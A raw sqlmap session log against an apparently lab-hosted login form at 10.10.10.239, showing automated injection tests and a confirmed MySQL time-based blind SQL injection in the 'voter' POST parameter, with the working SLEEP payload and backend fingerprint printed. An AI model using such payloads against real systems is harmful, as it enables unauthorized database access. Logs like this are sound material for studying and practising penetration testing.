        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.5.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:32:02 /2021-05-29/

do you want to check for the existence of site's sitemap(.xml) [y/N] 
[18:32:05] [INFO] starting crawler for target URL 'http://10.10.10.239'
[18:32:05] [INFO] searching for links with depth 1
[18:32:05] [INFO] searching for links with depth 2
please enter number of threads? [Enter for 1 (current)] 
[18:32:12] [WARNING] running in a single-thread mode. This could take a while
do you want to normalize crawling results [Y/n] 
do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] 
[#1] form:
POST http://10.10.10.239/login.php
POST data: voter=&password=&login=
do you want to test this form? [Y/n/q] 
> 
Edit POST data [default: voter=&password=&login=] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] 
[18:32:26] [INFO] using '/home/kali/.local/share/sqlmap/output/results-05292021_0632pm.csv' as the CSV results file in multiple targets mode
got a 302 redirect to 'http://10.10.10.239:80/index.php'. Do you want to follow? [Y/n] 
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] 
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=9v096tdgcus...naorp8ltrd'). Do you want to use those [Y/n] 
[18:32:30] [INFO] testing if the target URL content is stable
[18:32:30] [WARNING] POST parameter 'voter' does not appear to be dynamic
[18:32:30] [WARNING] heuristic (basic) test shows that POST parameter 'voter' might not be injectable
[18:32:30] [INFO] testing for SQL injection on POST parameter 'voter'
[18:32:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:32:31] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:32:32] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:32:33] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:32:33] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:32:35] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:32:36] [INFO] testing 'Generic inline queries'
[18:32:36] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:32:36] [WARNING] time-based comparison requires larger statistical model, please wait. (done)
[18:32:37] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:32:37] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:32:38] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:32:49] [INFO] POST parameter 'voter' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
[18:33:40] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:33:40] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:33:45] [INFO] checking if the injection point on POST parameter 'voter' is a false positive
POST parameter 'voter' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 73 HTTP(s) requests:
---
Parameter: voter (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: voter=hGKP' AND (SELECT 6278 FROM (SELECT(SLEEP(5)))QQai) AND 'QqQt'='QqQt&password=&login=QOrg
---
do you want to exploit this SQL injection? [Y/n] 
[18:34:15] [INFO] the back-end DBMS is MySQL
[18:34:15] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] web application technology: PHP 7.3.27, Apache 2.4.46, PHP
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:34:23] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-05292021_0632pm.csv'

[*] ending @ 18:34:23 /2021-05-29/

